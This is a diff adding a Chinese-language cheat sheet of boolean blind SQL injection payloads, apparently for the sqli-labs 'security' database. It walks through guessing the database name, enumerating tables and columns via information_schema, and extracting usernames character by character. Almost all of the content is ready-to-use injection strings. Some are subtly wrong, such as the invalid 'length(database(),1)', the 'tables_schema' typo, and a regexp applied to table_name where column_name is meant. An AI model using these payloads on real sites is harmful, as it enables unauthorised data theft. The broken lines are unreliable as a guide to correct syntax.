@@ -1,0 +1,53 @@
+【解释】：     查询数据库长度
+?id=1' and length(database(),1)='0——9'%23
+【解释】：     查询数据库第一个字母
+?id=1' and left(database(),1)='a——z/A——Z/0——9'
+【解释】：     查询数据库第二个字母
+?id=1' and left(database(),2)='aa——zz/AA——ZZ'
+【解释】：     这里的ascii是把substr(****,1,1)里面的字符转换成ascii所对应的值 而substr(****,1,1),这里面的1,1意思是第一个字母——而第二个字母就是2,1
+limit 0,1      这里是对应一个表   而想要第二个数据表就要——limit 1,1  
+?id=1' and ascii(substr((select table_name from information_schema.tables where tables_schema=database()limit 0,1),1,1))=(这里是ascii所对应的数字) 
+【解释】：     判断users表里面有无us****
+?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp 'us[a-z]' limit 0,1)%23
+【解释】：     判断有无username 
+?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1) 
+【解释】：     获取security库中的users表的username第一个字母	想要第二个让mid(****,1,1)变成mid(****,2,1)就OK了
+?id=1%27%20and%20ORD(MID((SELECT%20IFNULL(CAST(username%20AS%20CHAR),0x20)FROM%20security.users%20ORDER%20BY%20id%20LIMIT%200,1),1,1))=%2068--+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+?id=1' and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))>1%23
+
+mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位 
+Ord()函数同 ascii()，将字符转为 ascii 值
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
